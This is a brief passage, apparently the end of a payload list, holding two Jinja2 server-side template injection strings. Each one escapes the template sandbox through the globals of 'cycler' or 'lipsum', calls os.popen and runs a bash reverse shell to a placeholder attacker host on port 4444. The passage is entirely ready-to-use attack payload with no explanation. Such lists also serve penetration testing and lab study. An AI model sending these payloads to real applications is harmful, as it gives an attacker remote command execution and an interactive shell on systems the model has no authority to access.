...
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen("bash -c \"bash -i >& /dev/tcp/IP_Kali/4444 0>&1\"").read() }}

{{lipsum.__globals__.os.popen("bash -c \"bash -i >& /dev/tcp/IP_Kali/4444 0>&1\"").read()}}
```
